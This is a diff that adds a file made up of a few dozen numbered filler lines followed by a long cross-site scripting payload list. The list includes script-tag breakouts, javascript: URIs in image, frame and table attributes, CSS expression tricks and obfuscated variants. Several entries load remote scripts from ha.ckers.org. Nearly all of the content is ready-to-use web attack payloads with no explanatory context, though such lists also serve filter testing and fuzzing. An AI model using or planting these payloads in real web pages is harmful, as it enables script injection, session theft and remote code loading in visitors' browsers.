@@ -1,0 +1,125 @@
+
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+
+	
+
+<script>alert('XSS!');</script>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+¼script¾alert(¢XSS¢)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<script>prompt('XSS!');</script>
+';alert(String.fromCharCode(88,83,83))//\';prompt(String.fromCharCode(88,83,83))//";prompt(String.fromCharCode(88,83,83))//\";prompt(String.fromCharCode(88,83,83))//--></SCRIPT>">'><script>prompt(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<IMG SRC="javascript:prompt('XSS');">
+<IMG SRC=javascript:prompt('XSS')>
+<IMG SRC=javascrscriptipt:prompt('XSS')>
+<IMG SRC=JaVaScRiPt:prompt('XSS')>
+<IMG """><script>prompt("XSS")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:prompt('XSS');">
+<<script>prompt("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/prompt(a.source)</SCRIPT>
+\";prompt('XSS');//
+</TITLE><script>prompt("XSS");</SCRIPT>
+¼script¾prompt(¢XSS¢)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:prompt('XSS');">
+<IFRAME SRC="javascript:prompt('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:prompt('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:prompt('XSS')">
+<TABLE><TD BACKGROUND="javascript:prompt('XSS')">
+<DIV STYLE="background-image: url(javascript:prompt('XSS'))">
+<DIV STYLE="width: expression(prompt('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:prompt("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(prompt('XSS'))">
+<XSS STYLE="xss:expression(prompt('XSS'))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(prompt("XSS"))'>
+a="get";b="URL(ja\"";c="vascr";d="ipt:pro";e="mpt('XSS');\")";eval(a+b+c+d+e);
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;prompt(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
